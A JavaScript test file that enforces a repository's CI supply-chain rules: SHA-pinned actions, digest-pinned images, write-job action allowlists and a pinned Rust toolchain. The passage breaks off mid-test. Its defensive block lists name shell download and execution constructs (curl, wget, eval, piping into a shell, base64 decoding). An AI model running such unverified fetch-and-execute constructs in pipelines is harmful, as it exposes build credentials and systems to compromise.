// Supply-chain pins (#143, SECURITY.md): every GitHub Action is pinned to a full
// commit SHA with a version comment, and every Dockerfile base image to a digest.
//
// Write tokens versus third-party code (#194): a job whose GITHUB_TOKEN can write
// (packages, contents, id-token, security-events, ...) may only use the few
// actions below. Scanners, linters and setup actions run in read-only jobs. This
// is the lesson of the 2026 LiteLLM compromises: a scanner action that ran next to
// a publish credential was the way the credential was stolen.
//
// Workflows are read with the `yaml` package in strict mode (any parse error, a
// duplicate key or an alias bomb fails the test), aliases and merge keys are
// resolved, and the checks walk the parsed data, including local reusable
// workflows and local composite actions. The checks themselves are exercised
// against adversarial in-memory workflows at the bottom of this file.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { test } from "node:test";
import { isMap, isScalar, parseDocument, visit } from "yaml";

const root = fileURLToPath(new URL("..", import.meta.url));
const workflowsDir = join(root, ".github/workflows");
const actionsDir = join(root, ".github/actions");
const FETCH_SCRIPT = ".github/scripts/fetch-verified.sh";

// Actions allowed in a job that has any `write` permission, explicit or inherited
// from the workflow level, from the caller of a reusable workflow, or from the
// repository default when nothing is declared. Keep this minimal: every entry must
// be used by a write job (checked below). Each one is GitHub-owned or the
// registry/build plumbing the image pipeline cannot do without, and none downloads
// an executable at run time: setup-buildx-action can, so every write job that uses
// it first asserts the runner's own Buildx and sets no `version` (checked below).
// Tools that only need to read (Trivy, helm, kubeconform, cargo-deny, Node, Rust,
// the CodeQL bundle, ...) never belong here.
export const WRITE_JOB_ACTIONS = new Map([
  // GitHub-owned. Fetches the sources to build, the script to run or the SARIF file's repository.
  ["actions/checkout", "GitHub-owned; no network access beyond the repository"],
  // GitHub-owned. The upload job reads the SARIF file the read-only analysis job produced.
  ["actions/download-artifact", "GitHub-owned; hands the SARIF file from the read-only analysis job to the upload job"],
  // Docker-owned. The three steps that build and push an image to ghcr.io; the
  // pipeline cannot push without them. login-action only writes the Docker config.
  ["docker/setup-buildx-action", "Docker-owned; creates the BuildKit builder (pinned image) for build-push and imagetools"],
  ["docker/login-action", "Docker-owned; logs in to ghcr.io with the job token"],
  ["docker/build-push-action", "Docker-owned; builds and pushes the image with its SBOM and provenance"],
  // GitHub-owned. Uploading code-scanning results needs `security-events: write`.
  // It sends a SARIF file and downloads no CodeQL bundle (init and analyze, which
  // do, run in a read-only job).
  ["github/codeql-action/upload-sarif", "GitHub-owned; uploads the SARIF file the read-only analysis job wrote"],
]);

// Actions that download a tool at run time without a checksum that this repository
// pins. They are not used anywhere: install the tool with
// .github/scripts/fetch-verified.sh (the helm, kubeconform, Trivy and cosign steps,
// .github/actions/setup-node).
const UNVERIFIED_INSTALLERS = new Map([
  ["actions/setup-node", "downloads a floating Node release without a checksum; use ./.github/actions/setup-node"],
  ["azure/setup-helm", "does not verify the helm download; fetch it with .github/scripts/fetch-verified.sh"],
  ["aquasecurity/trivy-action", "installs Trivy through setup-trivy, whose checksum comes from the same release; fetch the pinned binary"],
  ["aquasecurity/setup-trivy", "the checksum comes from the same release; fetch the pinned binary"],
  ["sigstore/cosign-installer", "fetch the pinned cosign release with .github/scripts/fetch-verified.sh"],
]);

// ---- strict YAML ----

export function parseStrict(text, file) {
  const doc = parseDocument(text, { version: "1.2", uniqueKeys: true, merge: true, prettyErrors: true });
  const problems = [...doc.errors, ...doc.warnings].map(e => e.message.split("\n")[0]);
  if (problems.length) throw new Error(`${file}: ${problems.join("; ")}`);
  if (!isMap(doc.contents)) throw new Error(`${file}: the top level is not a mapping`);
  return doc;
}

// Aliases and merge keys resolved; an alias bomb throws.
export const toData = doc => doc.toJS({ maxAliasCount: 100 });

// ---- repository files ----

const walk = dir => readdirSync(dir, { withFileTypes: true }).flatMap(e => (e.isDirectory() ? walk(join(dir, e.name)) : [join(dir, e.name)]));

function repoFiles() {
  const rel = p => p.slice(root.length);
  const workflows = readdirSync(workflowsDir).filter(f => /\.ya?ml$/.test(f)).map(f => join(workflowsDir, f));
  const actions = existsSync(actionsDir) ? walk(actionsDir).filter(f => /(^|\/)action\.ya?ml$/.test(f)) : [];
  return [...workflows, ...actions].map(path => ({ file: rel(path), text: readFileSync(path, "utf8") }));
}

export function readLocalFromRepo(path) {
  const full = join(root, path);
  return existsSync(full) ? readFileSync(full, "utf8") : null;
}

// ---- pinning ----

// Every `uses:` anywhere in the file, read from the syntax tree so comments and
// flow-style or aliased values are seen as they are.
export function pinViolations(text, file) {
  const doc = parseStrict(text, file);
  const out = [];
  visit(doc, {
    Pair(_, pair) {
      if (!isScalar(pair.key) || pair.key.value !== "uses") return;
      const v = pair.value;
      if (!isScalar(v) || typeof v.value !== "string") {
        out.push(`${file}: a 'uses' value is not a plain string (aliases and expressions cannot be checked)`);
        return;
      }
      const ref = v.value;
      if (ref.startsWith("./")) return; // local actions and reusable workflows
      if (ref.startsWith("docker://")) {
        if (!/@sha256:[0-9a-f]{64}$/.test(ref)) out.push(`${file}: ${ref} is not pinned by digest`);
        return;
      }
      if (!/@[0-9a-f]{40}$/.test(ref) || !(v.comment ?? "").trim()) out.push(`${file}: ${ref} needs a full commit SHA and a version comment`);
    },
  });
  return out;
}

// ---- permissions ----

// With no `permissions` anywhere the job gets the repository's default token,
// which can be read/write.
const DEFAULT_PERMISSIONS = "write-all";

export function hasWrite(perms) {
  if (typeof perms === "string") return perms !== "read-all";
  if (perms && typeof perms === "object" && !Array.isArray(perms)) {
    return Object.values(perms).some(v => !["read", "none"].includes(v));
  }
  return true; // null, a list or a number: cannot be shown read-only
}

// A job's own block replaces the workflow's. Without either, a called workflow
// inherits the caller's permissions and a top-level one the repository default.
export function jobPermissions(data, job, callerPerms) {
  if (job.permissions !== undefined) return job.permissions;
  if (data.permissions !== undefined) return data.permissions;
  return callerPerms !== undefined ? callerPerms : DEFAULT_PERMISSIONS;
}

// A caller's permissions cap the called workflow's jobs.
export function jobCanWrite(data, job, callerPerms) {
  if (callerPerms !== undefined && !hasWrite(callerPerms)) return false;
  return hasWrite(jobPermissions(data, job, callerPerms));
}

const stepsOf = job => (Array.isArray(job?.steps) ? job.steps.filter(s => s && typeof s === "object") : []);
const jobsOf = data => Object.entries(data?.jobs && typeof data.jobs === "object" ? data.jobs : {});
export const actionName = ref => String(ref).split("@")[0].toLowerCase();

const isLocal = ref => ref.startsWith("./") || ref.startsWith("../");
const normalizeLocal = ref => ref.replace(/^\.\//, "").replace(/\/+$/, "");

function loadLocalAction(dir, readLocal) {
  for (const name of ["action.yml", "action.yaml"]) {
    const text = readLocal(`${dir}/${name}`);
    if (text !== null) return { file: `${dir}/${name}`, text };
  }
  return null;
}

// One reference used by a job that can write. Local composite actions are opened
// and their steps checked; local reusable workflows are checked as their own jobs
// (with the caller's permissions as the cap).
function checkRef(ref, kind, ctx, where, out, depth) {
  if (typeof ref !== "string") {
    out.push(`${where}: a 'uses' value is not a string`);
    return;
  }
  if (isLocal(ref)) {
    const path = normalizeLocal(ref);
    if (ref.startsWith("../") || path.split("/").includes("..")) {
      out.push(`${where}: ${ref} leaves the repository`);
    } else if (kind === "job") {
      if (!path.startsWith(".github/workflows/")) out.push(`${where}: ${ref} is not a local reusable workflow`);
    } else if (depth >= 5) {
      out.push(`${where}: ${ref} nests composite actions too deeply to check`);
    } else {
      const action = loadLocalAction(path, ctx.readLocal);
      if (!action) {
        out.push(`${where}: cannot read ${ref}`);
        return;
      }
      const data = toData(parseStrict(action.text, action.file));
      if (data.runs?.using === "docker" && String(data.runs.image ?? "").startsWith("docker://")) {
        out.push(`${where}: ${ref} runs ${data.runs.image}`);
      }
      for (const step of stepsOf(data.runs)) {
        if (step.uses !== undefined) checkRef(step.uses, "step", ctx, `${where} via ${ref}`, out, depth + 1);
      }
    }
    return;
  }
  if (kind === "step" && ctx.allowed.has(actionName(ref))) return;
  out.push(`${where}: ${ref} is not on the write-job allowlist`);
}

// Violations for one workflow document: jobs that can write using anything off
// the allowlist. `callerPerms` is set when the workflow is called by another one.
export function workflowViolations(file, text, ctx, callerPerms, depth = 0) {
  const out = [];
  const data = toData(parseStrict(text, file));
  for (const [name, job] of jobsOf(data)) {
    const canWrite = jobCanWrite(data, job, callerPerms);
    const label = `${file}: job '${name}'${callerPerms !== undefined ? " (called)" : ""}`;
    if (canWrite) {
      if (job.uses !== undefined) checkRef(job.uses, "job", ctx, `${label} uses`, out, 0);
      stepsOf(job).forEach((step, i) => {
        if (step.uses !== undefined) checkRef(step.uses, "step", ctx, `${label} step ${i + 1} (can write) uses`, out, 0);
      });
    }
    // A local reusable workflow's own jobs, under what this job grants it.
    if (typeof job.uses === "string" && isLocal(job.uses)) {
      const path = normalizeLocal(job.uses);
      const callee = path.startsWith(".github/workflows/") && depth < 5 ? ctx.readLocal(path) : null;
      if (callee === null) {
        if (canWrite) out.push(`${label}: cannot read ${job.uses}`);
      } else {
        const granted = canWrite ? jobPermissions(data, job, callerPerms) : {};
        out.push(...workflowViolations(path, callee, ctx, granted, depth + 1));
      }
    }
  }
  return out;
}

export function allWriteViolations(files, readLocal, allowed = WRITE_JOB_ACTIONS) {
  const ctx = { readLocal, allowed };
  const out = files.filter(f => f.file.includes("workflows/")).flatMap(f => workflowViolations(f.file, f.text, ctx));
  return [...new Set(out)];
}

// ---- Buildx ----

// docker/setup-buildx-action downloads an unverified Buildx when the runner has
// none, when `version` is set, or for the cloud driver. In a job that can write it
// must be preceded by a step that fails unless the runner already has Buildx, and
// it must set none of those inputs. Its BuildKit image is pinned by digest anywhere.
export function buildxViolations(file, text, callerPerms) {
  const out = [];
  const data = toData(parseStrict(text, file));
  for (const [name, job] of jobsOf(data)) {
    const canWrite = jobCanWrite(data, job, callerPerms);
    const steps = stepsOf(job);
    steps.forEach((step, i) => {
      if (typeof step.uses !== "string" || actionName(step.uses) !== "docker/setup-buildx-action") return;
      // The guard is the step immediately before, unconditional, failure-propagating,
      // and its whole script is the one command.
      const prev = steps[i - 1];
      const guarded = !!prev && typeof prev.run === "string" && prev.run.trim() === "docker buildx version"
        && prev.if === undefined && prev["continue-on-error"] === undefined && prev.shell === undefined;
      const where = `${file}: job '${name}' step ${i + 1}`;
      const w = step.with ?? {};
      if (w.version !== undefined) out.push(`${where}: sets 'version', which downloads Buildx`);
      if (String(w.driver ?? "docker-container") === "cloud") out.push(`${where}: the cloud driver downloads Buildx`);
      if (!/(^|[\s,])image=\S+@sha256:[0-9a-f]{64}(\s|,|$)/.test(String(w["driver-opts"] ?? ""))) out.push(`${where}: the BuildKit image is not pinned by digest`);
      if (canWrite && !guarded) out.push(`${where}: no earlier 'docker buildx version' step to rule out the download (job can write)`);
    });
  }
  return out;
}

// ---- run-time downloads ----

// Every run-time download goes through one first-party script, which checks a
// SHA-256 before the file is used. Any other mechanism in a run: block fails.
const DOWNLOADERS = [
  [/\bcurl\b/, "curl"],
  [/\bwget\b/, "wget"],
  [/\bgh\s+(release|run|extension|attestation|repo\s+clone)\b/, "gh download"],
  [/\bgh\s+api\b/, "gh api"],
  [/\b(Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b/i, "PowerShell download"],
  [/\b(urllib|urlopen|http\.client|requests\.(get|post)|fetch\s*\(|https?\.get)\b/, "inline HTTP client"],
  [/\b(python3?|node|deno|bun|perl|ruby)\s+-[ec]\b/, "inline script"],
  [/\b(go install|cargo install|cargo binstall|pip3? install|brew install|npm (install|i) (-g|--global)|gem install)\b/, "package-manager tool install"],
];

// The staging rehearsal's readiness probe talks to the local stack, not the
// internet. Exempt only as a whole line, exactly (no extra arguments such as --next).
const LOCAL_PROBE = /^[ \t]*curl --fail --silent --show-error --cacert \.local\/staging\/local-ca\.crt https:\/\/localhost:18443\/health\/ready[ \t]*$/gm;

// `gh api` talks to the GitHub API with the job token (prune-dev-images deletes old
// dev package versions); it fetches no code. Exempt only these exact shapes, in that
// file: listing and deleting this repository's own container package versions.
const GH_API_FILES = new Set([".github/workflows/prune-dev-images.yml"]);
const GH_API_ALLOWED = [
  /gh api --paginate "\/users\/\$OWNER\/packages\/container\/\$package\/versions\?per_page=100" \| jq -s 'add \/\/ \[\]'/g,
  /gh api -X DELETE "\/users\/\$OWNER\/packages\/container\/\$package\/versions\/\$id"/g,
];

// Constructs that hide what runs. The check above is a guard against accidental,
// unverified downloads; it cannot model arbitrary shell, so these are refused
// outright and anything cleverer is for review to catch (main is protected).
const OBSCURING = [
  [/\beval\b/, "eval"],
  [/\|\s*(sudo\s+)?(ba|z|da)?sh\b/, "piping into a shell"],
  [/\bbase64\s+(-d|--decode)\b/, "base64 decoding"],
  [/\bsource\s+<\(|\.\s+<\(/, "sourcing a process substitution"],
  [/--next\b/, "curl --next"],
];

export function downloadViolations(file, script) {
  const out = [];
  // Whole-line shell comments do not run.
  const joined = script.replace(/^[ \t]*#.*$/gm, "").replace(/\\\n\s*/g, " ");
  for (const [re, label] of OBSCURING) {
    if (re.test(joined)) out.push(`${file}: ${label} in a run step is not allowed`);
  }
  let text = joined.replace(LOCAL_PROBE, "");
  if (GH_API_FILES.has(file)) for (const re of GH_API_ALLOWED) text = text.replace(re, "");
  for (const [re, label] of DOWNLOADERS) {
    if (re.test(text)) out.push(`${file}: ${label} in a run step; use ${FETCH_SCRIPT} <https-url> <sha256> <dest>`);
  }
  // Calls of the script: literal https URL, literal 64-hex checksum.
  const call = /(?:^|[\s;&|(])(?:bash\s+|sh\s+|\.\/)?(\S*fetch-verified\.sh)(.*)/gm;
  for (const m of text.matchAll(call)) {
    const where = `${file}: ${m[0].trim().slice(0, 100)}`;
    if (m[1] !== FETCH_SCRIPT) out.push(`${where}: call the script as ${FETCH_SCRIPT}`);
    const args = m[2].match(/^\s+"?(https:\/\/[^\s"'$`\\{}()<>;|&]+)"?\s+"?([0-9a-f]{64})"?\s+("[^"]+"|'[^']+'|[^\s;&|]+)\s*(;;)?\s*$/);
    if (!args) out.push(`${where}: the URL and checksum must be literals (an https:// URL and 64 hex digits)`);
  }
  return out;
}

function runScripts(data) {
  const scripts = [];
  for (const [name, job] of jobsOf(data)) stepsOf(job).forEach((s, i) => typeof s.run === "string" && scripts.push([`job '${name}' step ${i + 1}`, s.run]));
  for (const [i, s] of stepsOf(data.runs).entries()) if (typeof s.run === "string") scripts.push([`step ${i + 1}`, s.run]);
  return scripts;
}

// ---- tests on the repository ----

test("every workflow and local action parses strictly", () => {
  const files = repoFiles();
  assert.ok(files.some(f => f.file.endsWith("image.yml")));
  for (const { file, text } of files) toData(parseStrict(text, file));
});

test("every workflow action is pinned to a commit SHA with a version comment", () => {
  const unpinned = repoFiles().flatMap(({ file, text }) => pinViolations(text, file));
  assert.deepEqual(unpinned, []);
});

test("every Dockerfile base image is pinned by digest", () => {
  const files = allDockerfiles();
  assert.ok(files.length >= 2, "expected to find the root and deploy/loadtest Dockerfiles");
  const unpinned = [];
  for (const { file, text } of files) {
    text.split("\n").forEach((line, i) => {
      const m = line.match(/^FROM\s+(\S+)/i);
      if (m && !/@sha256:[0-9a-f]{64}$/.test(m[1])) unpinned.push(`${file}:${i + 1} ${m[1]}`);
    });
  }
  assert.deepEqual(unpinned, []);
});

// ---- Rust toolchain pin (#354) ----
//
// rust-toolchain.toml, every Rust build stage in every Dockerfile, and every
// `dtolnay/rust-toolchain` step's `toolchain:` input must all name the same exact version,
// and nothing in a workflow may override the pin at run time. A floating channel (`stable`,
// `beta`, `nightly`, with or without a date) or an override (`RUSTUP_TOOLCHAIN`, `rustup
// default|override|toolchain install`, `cargo +<toolchain>`) anywhere defeats the whole
// point: CI would no longer compile with the same compiler as local gates and release
// builds (PR #348's local-pass/CI-fail divergence).

const FLOATING_RUST_CHANNEL = /^(stable|beta|nightly)(-\d{4}-\d{2}-\d{2})?$/i;

// Minimal, strict parser for rust-toolchain.toml's [toolchain] table only (there is no TOML
// dependency in this repository). It refuses anything the file does not actually use
// (a second [toolchain] table, unquoted/multi-line values, an unexpected key, a
// non-flat-array components/targets value) instead of silently ignoring it.
export function parseToolchainToml(text) {
  const lines = text.split("\n").map(l => l.replace(/#.*$/, "").trim()).filter(Boolean);
  const start = lines.indexOf("[toolchain]");
  if (start === -1) throw new Error("rust-toolchain.toml has no [toolchain] table");
  if (lines.indexOf("[toolchain]", start + 1) !== -1) throw new Error("rust-toolchain.toml has more than one [toolchain] table");
  const table = {};
  for (let i = start + 1; i < lines.length && !lines[i].startsWith("["); i++) {
    const m = lines[i].match(/^(\w+)\s*=\s*(.+)$/);
    if (!m) throw new Error(`rust-toolchain.toml: unparseable line in [toolchain]: ${lines[i]}`);
    const [, key, raw] = m;
    if (key in table) throw new Error(`rust-toolchain.toml: duplicate key in [toolchain]: ${key}`);
    if (key === "channel" || key === "profile") {
      const sm = raw.match(/^"([^"]*)"$/);
      if (!sm) throw new Error(`rust-toolchain.toml: ${key} must be a plain quoted string, got: ${raw}`);
      table[key] = sm[1];
    } else if (key === "components" || key === "targets") {
      const am = raw.match(/^\[\s*((?:"[^"]*"\s*,?\s*)*)\]$/);
      if (!am) throw new Error(`rust-toolchain.toml: ${key} must be a flat array of quoted strings, got: ${raw}`);
      table[key] = [...am[1].matchAll(/"([^"]*)"/g)].map(mm => mm[1]);
    } else {
      throw new Error(`rust-toolchain.toml: unexpected key in [toolchain]: ${key}`);
    }
  }
  if (!("channel" in table)) throw new Error("rust-toolchain.toml: [toolchain] has no channel");
  return table;
}

function readRustToolchainChannel() {
  const text = readLocalFromRepo("rust-toolchain.toml");
  if (text === null) throw new Error("rust-toolchain.toml is missing");
  return parseToolchainToml(text).channel;
}

// Every `Dockerfile` anywhere in the repository (not a fixed list), skipping directories
// that are never source: VCS internals, dependency/build output.
const DOCKERFILE_SKIP_DIRS = /^(\.git|node_modules|target.*|dist|\.turbo)$/;
export function findDockerfiles(dir = root) {
  const out = [];
  for (const e of readdirSync(dir, { withFileTypes: true })) {
    if (e.isDirectory()) {
      if (DOCKERFILE_SKIP_DIRS.test(e.name)) continue;
      out.push(...findDockerfiles(join(dir, e.name)));
    } else if (e.name === "Dockerfile") {
      out.push(join(dir, e.name));
    }
  }
  return out;
}
const allDockerfiles = () => findDockerfiles().map(p => ({ file: p.slice(root.length), text: readFileSync(p, "utf8") }));

// `ARG NAME=value` defaults declared anywhere in a Dockerfile, so a `FROM ${NAME}` stage can
// be resolved before it is checked. An ARG with no default (supplied only at build time)
// cannot be resolved here and is left as-is; it will not match a `rust:` reference unless the
// literal text already does.
function resolveDockerfileArgs(text) {
  const args = new Map();
  for (const line of text.split("\n")) {
    const m = line.match(/^\s*ARG\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+?)\s*$/);
    if (m) args.set(m[1], m[2].replace(/^["']|["']$/g, ""));
  }
  return args;
}

function substituteArgs(target, args) {
  return target.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (whole, braced, bare) => {
    const name = braced ?? bare;
    return args.has(name) ? args.get(name) : whole;
  });
}

// Recognizes any reference whose repository is exactly `rust` (the final path segment, up to
// but not including any `:tag` or `@digest`), case-insensitively, with any registry/path prefix
// (`rust`, `rust:1.99.1`, `rust@sha256:...`, `docker.io/rust:...`,
// `mirror.gcr.io/library/rust@sha256:...`). An untagged reference (`rust`, or a digest-only
// reference such as `rust@sha256:...`, with or without a registry prefix) is still a `rust`
// image: its tag/version are null, which `rustVersionViolations` flags as missing a version.
// Returns the bare tag (null if untagged), the version it names if the tag is an exact
// `x.y.z[-suffix]` version (null for a floating or otherwise unsupported form such as `stable`,
// `stable-bookworm`, `latest`, a date-stamped nightly, or no tag at all), and whether it carries
// a valid `@sha256:<64 hex>` digest. Returns null for anything that is not a `rust` image
// reference at all.
export function extractRustImageRef(ref) {
  if (typeof ref !== "string") return null;
  const atIndex = ref.indexOf("@");
  const beforeDigest = atIndex === -1 ? ref : ref.slice(0, atIndex);
  const digestRaw = atIndex === -1 ? null : ref.slice(atIndex + 1);
  const slash = beforeDigest.lastIndexOf("/");
  const lastSegment = slash === -1 ? beforeDigest : beforeDigest.slice(slash + 1);
  const colon = lastSegment.indexOf(":");
  const repo = colon === -1 ? lastSegment : lastSegment.slice(0, colon);
  if (!/^rust$/i.test(repo)) return null;
  const tag = colon === -1 ? null : lastSegment.slice(colon + 1);
  const vm = tag ? tag.match(/^(\d+\.\d+\.\d+)(-\S+)?$/) : null;
  return {
    tag,
    version: vm ? vm[1] : null,
    digestOk: !!digestRaw && /^sha256:[0-9a-f]{64}$/i.test(digestRaw),
    digest: digestRaw ? digestRaw.replace(/^sha256:/i, "") : null,
  };
}

// Every `FROM [--platform=...] <image>` line in one Dockerfile's text that names a `rust`
// image, in any form (every build stage, not just the first match; ARG-substituted targets
// resolved against ARG defaults declared anywhere earlier in the same file).
export function parseDockerfileRustStages(file, text) {
  const out = [];
  const args = resolveDockerfileArgs(text);
  text.split("\n").forEach((line, i) => {
    const m = line.match(/^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)/i);
    if (!m) return;
    const target = substituteArgs(m[1], args);
    const parsed = extractRustImageRef(target);
    if (parsed) out.push({ file, line: i + 1, ref: target, ...parsed });
  });
  return out;
}

// Every job `container:` (string or `{image:...}`) and `services.<name>` (string or
// `{image:...}`) image reference in one workflow document, regardless of which job declares it.
export function containerImagesIn(data) {
  const out = [];
  for (const [name, job] of jobsOf(data)) {
    if (typeof job?.container === "string") out.push({ where: `job '${name}' container`, image: job.container });
    else if (job?.container && typeof job.container === "object" && typeof job.container.image === "string") {
      out.push({ where: `job '${name}' container.image`, image: job.container.image });
    }
    const services = job?.services && typeof job.services === "object" ? job.services : {};
    for (const [svcName, svc] of Object.entries(services)) {
      if (typeof svc === "string") out.push({ where: `job '${name}' services.${svcName}`, image: svc });
      else if (svc && typeof svc === "object" && typeof svc.image === "string") {
        out.push({ where: `job '${name}' services.${svcName}.image`, image: svc.image });
      }
    }
  }
  return out;
}

export function rustStagesFromWorkflowContainers(file, data) {
  return containerImagesIn(data).flatMap(({ where, image }) => {
    const parsed = extractRustImageRef(image);
    return parsed ? [{ file, line: where, ref: image, ...parsed }] : [];
  });
}

// Compose files CI actually invokes: every `-f <path>` / `--file <path>` / `-f=<path>` /
// `--file=<path>` argument (any number of them) found on the same line as a `docker
// compose`/`docker-compose` invocation in a run: script. A path built from a shell variable
// cannot be resolved here and is skipped, same limitation as the fetch-verified.sh literal-URL
// check elsewhere in this file.
export function composeFilesReferencedIn(script) {
  const files = new Set();
  const invocationRe = /\bdocker(?:\s+|-)compose\b/gi;
  let m;
  while ((m = invocationRe.exec(script))) {
    const lineEnd = script.indexOf("\n", m.index);
    const line = lineEnd === -1 ? script.slice(m.index) : script.slice(m.index, lineEnd);
    const flagRe = /(?:-f|--file)(?:=|\s+)"?([^\s"']+\.ya?ml)"?/g;
    for (const fm of line.matchAll(flagRe)) files.add(fm[1]);
  }
  return [...files];
}

export function rustImagesInCompose(file, text) {
  const data = toData(parseStrict(text, file));
  const services = data.services && typeof data.services === "object" ? data.services : {};
  return Object.entries(services).flatMap(([name, svc]) => {
    const image = svc && typeof svc === "object" ? svc.image : undefined;
    if (typeof image !== "string") return [];
    const parsed = extractRustImageRef(image);
    return parsed ? [{ file, line: `service '${name}'`, ref: image, ...parsed }] : [];
  });
}

// Every Rust image reference anywhere CI can run one: Dockerfile build stages, workflow job
// `container:`/`services:` images, and compose files CI invokes with `-f`.
function allRustImageStages() {
  const stages = allDockerfiles().flatMap(({ file, text }) => parseDockerfileRustStages(file, text));
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    stages.push(...rustStagesFromWorkflowContainers(file, data));
    for (const [, script] of runScripts(data)) {
      for (const composePath of composeFilesReferencedIn(script)) {
        const composeText = readLocalFromRepo(composePath);
        if (composeText !== null) stages.push(...rustImagesInCompose(composePath, composeText));
      }
    }
  }
  return stages;
}

// Every Rust stage must pin the same, exact pinned-channel version by digest (no floating or
// unsupported tag form), and every reference pinning that version must pin the identical
// digest (it is the same published image).
export function rustVersionViolations(stages, channel) {
  const out = [];
  const digestByVersion = new Map();
  for (const s of stages) {
    if (!s.version) {
      const label = s.tag ? `'${s.tag}'` : "(no tag at all)";
      out.push(`${s.file}:${s.line}: rust image tag ${label} is not an exact version (floating, unsupported, or missing)`);
      continue;
    }
    if (!s.digestOk) out.push(`${s.file}:${s.line}: rust:${s.tag} is not pinned by digest`);
    if (s.version !== channel) out.push(`${s.file}:${s.line}: pins rust ${s.version}, rust-toolchain.toml pins ${channel}`);
    if (s.digestOk) {
      const seen = digestByVersion.get(s.version);
      if (seen === undefined) digestByVersion.set(s.version, s.digest);
      else if (seen !== s.digest) out.push(`${s.file}:${s.line}: digest ${s.digest} for rust:${s.version} disagrees with another reference's ${seen}`);
    }
  }
  return out;
}

// Every `dtolnay/rust-toolchain` step anywhere (workflow jobs and composite action `runs`),
// with the `toolchain:` input it sets (undefined if absent).
function dtolnayToolchainSteps() {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    for (const [name, job] of jobsOf(data)) {
      stepsOf(job).forEach((step, i) => {
        if (typeof step.uses === "string" && actionName(step.uses) === "dtolnay/rust-toolchain") {
          found.push({ file, where: `job '${name}' step ${i + 1}`, toolchain: step.with?.toolchain });
        }
      });
    }
    stepsOf(data.runs).forEach((step, i) => {
      if (typeof step.uses === "string" && actionName(step.uses) === "dtolnay/rust-toolchain") {
        found.push({ file, where: `composite step ${i + 1}`, toolchain: step.with?.toolchain });
      }
    });
  }
  return found;
}

test("rust-toolchain.toml, every Dockerfile's Rust build stage and every dtolnay/rust-toolchain step pin the same exact version (#354)", () => {
  const channel = readRustToolchainChannel();
  assert.match(channel, /^\d+\.\d+\.\d+$/, "rust-toolchain.toml channel must be an exact x.y.z version, not a floating channel");
  assert.doesNotMatch(channel, FLOATING_RUST_CHANNEL, "rust-toolchain.toml channel must not float");

  const stages = allRustImageStages();
  assert.ok(stages.length >= 2, "expected a rust:<version>-bookworm stage in both the root and deploy/loadtest Dockerfiles");
  assert.deepEqual(rustVersionViolations(stages, channel), []);

  const steps = dtolnayToolchainSteps();
  assert.ok(steps.length > 0, "expected at least one dtolnay/rust-toolchain step in the workflows");
  for (const step of steps) {
    assert.ok(step.toolchain, `${step.file}: ${step.where} must set an explicit 'toolchain' input (no implicit floating default)`);
    const toolchain = String(step.toolchain);
    assert.doesNotMatch(toolchain, FLOATING_RUST_CHANNEL, `${step.file}: ${step.where} toolchain '${toolchain}' must not be a floating channel`);
    assert.equal(toolchain, channel, `${step.file}: ${step.where} toolchain '${toolchain}' disagrees with rust-toolchain.toml's ${channel}`);
  }
});

test("no dtolnay/rust-toolchain reference carries a floating-channel version comment", () => {
  // Defensive, on top of the exact-input check above: a '# stable'/'# beta'/'# nightly'
  // comment next to a SHA pin could mislead a reviewer bumping the version by hand.
  for (const { file, text } of repoFiles()) {
    const doc = parseStrict(text, file);
    visit(doc, {
      Pair(_, pair) {
        if (!isScalar(pair.key) || pair.key.value !== "uses") return;
        const v = pair.value;
        if (!isScalar(v) || typeof v.value !== "string") return;
        if (actionName(v.value) !== "dtolnay/rust-toolchain") return;
        const comment = (v.comment ?? "").trim();
        assert.doesNotMatch(comment, /^(stable|beta|nightly)$/i, `${file}: ${v.value} has a floating-channel comment '${comment}'`);
      },
    });
  }
});

// Structural checks above require the pin and catch disagreement; these catch a workflow
// (or local composite action) separately overriding it at run time, even though the pinned
// step itself is correct.
function envRustOverrides(file, env, where) {
  if (env && typeof env === "object" && "RUSTUP_TOOLCHAIN" in env) return [`${file}: ${where} sets RUSTUP_TOOLCHAIN, which can override the pinned toolchain`];
  return [];
}

function runRustOverrides(file, where, script) {
  const out = [];
  const joined = script.replace(/^[ \t]*#.*$/gm, "");
  if (/\bRUSTUP_TOOLCHAIN\b/.test(joined)) out.push(`${file}: ${where} references RUSTUP_TOOLCHAIN`);
  if (/\brustup\s+(default|override\s+set|toolchain\s+install)\b/.test(joined)) out.push(`${file}: ${where} runs a rustup command that can select an unpinned toolchain`);
  if (/\bcargo\s+\+\S/.test(joined)) out.push(`${file}: ${where} invokes 'cargo +<toolchain>', bypassing the pin`);
  return out;
}

function withToolchainOverrides(file, where, withBlock, channel) {
  if (!withBlock || typeof withBlock !== "object" || !("toolchain" in withBlock)) return [];
  const v = String(withBlock.toolchain ?? "");
  if (FLOATING_RUST_CHANNEL.test(v) || v !== channel) return [`${file}: ${where} sets toolchain '${v}', which disagrees with the pinned ${channel}`];
  return [];
}

export function allRustOverrideViolations(files, channel) {
  // No path-based filter here: `files` is already scoped to workflows and local composite
  // actions by whoever builds the list (repoFiles() in the real check; an in-memory fixture
  // list in tests), and a fixture's path does not need to look like a real workflow path.
  const out = [];
  for (const { file, text } of files) {
    const data = toData(parseStrict(text, file));
    out.push(...envRustOverrides(file, data.env, "workflow env"));
    for (const [name, job] of jobsOf(data)) {
      out.push(...envRustOverrides(file, job.env, `job '${name}' env`));
      stepsOf(job).forEach((step, i) => {
        out.push(...envRustOverrides(file, step.env, `job '${name}' step ${i + 1} env`));
        out.push(...withToolchainOverrides(file, `job '${name}' step ${i + 1}`, step.with, channel));
        if (typeof step.run === "string") out.push(...runRustOverrides(file, `job '${name}' step ${i + 1}`, step.run));
      });
    }
    stepsOf(data.runs).forEach((step, i) => {
      out.push(...envRustOverrides(file, step.env, `composite step ${i + 1} env`));
      out.push(...withToolchainOverrides(file, `composite step ${i + 1}`, step.with, channel));
      if (typeof step.run === "string") out.push(...runRustOverrides(file, `composite step ${i + 1}`, step.run));
    });
  }
  return out;
}

test("no workflow or local composite action overrides the pinned Rust toolchain at run time (#354)", () => {
